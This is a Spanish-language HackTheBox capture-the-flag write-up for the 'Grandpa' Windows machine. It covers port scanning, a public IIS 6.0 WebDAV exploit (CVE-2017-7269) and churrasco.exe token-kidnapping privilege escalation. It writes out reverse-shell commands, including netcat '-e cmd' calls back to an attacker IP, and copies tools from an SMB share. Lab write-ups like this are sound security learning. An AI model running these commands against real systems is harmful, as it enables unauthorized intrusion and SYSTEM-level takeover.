---
title: HackTheBox - Grandpa
author: cotes
date: 2023-09-14 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Windows, 'ISS 6.0 (CVE-2017-7269)', 'Token Kidnapping Local Privilege Escalation (churrasco.exe)']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Grandpa/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Grandpa Machine Logo
---

Máquina Windows de nivel **Easy** de HackTheBox.

Técnicas usadas: **ISS 6.0 (CVE-2017-7269), Token Kidnapping Local Privilege Escalation (churrasco.exe)**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Grandpa/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos abiertos

* **`nmap -p<Puertos> -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Grandpa/02-versions.png)

>  A diferencia de la Máquina Granny, aquí no tenemos el método **PUT** permitido, pero, tenemos el método `PROPFIND`, po lo que buscaremos algún exploit.
{: .prompt-info }

c. Nos encontramos con este [exploit](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/tree/master)

```bash
❯ python2 rce.py <IP Grandpa> 80 <tun0 IP> 443

❯ nc -lvnp 443                                                                                                                                                                                
Microsoft Windows [Version 5.2.3790]                                                                                                                                                          
(C) Copyright 1985-2003 Microsoft Corp.                                                                                                                                                       
                                                                                                                                                                                              
c:\windows\system32\inetsrv>
```

### Escalada de Privilegios 💹

a. La forma de escalar privilegios es la misma de la Máquina Granny

```bash
❯ ls
churrasco.exe nc.exe
---------------------------------------------------------------
C:\Temp>copy \\10.10.14.18\Share\nc.exe
C:\Temp>copy \\10.10.14.18\Share\churrasco.exe
C:\Temp>dir
09/15/2023  08:14 PM            31,232 churrasco.exe
09/15/2023  08:15 PM            36,528 nc.exe
```

b. Entablamos una reverse shell

```bash
C:\Temp>.\churrasco.exe -d "C:\Temp\nc.exe -e cmd 10.10.14.18 4445"
--------------------------------------------------------------------
❯ nc -lvnp 4445
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
nt authority\system
```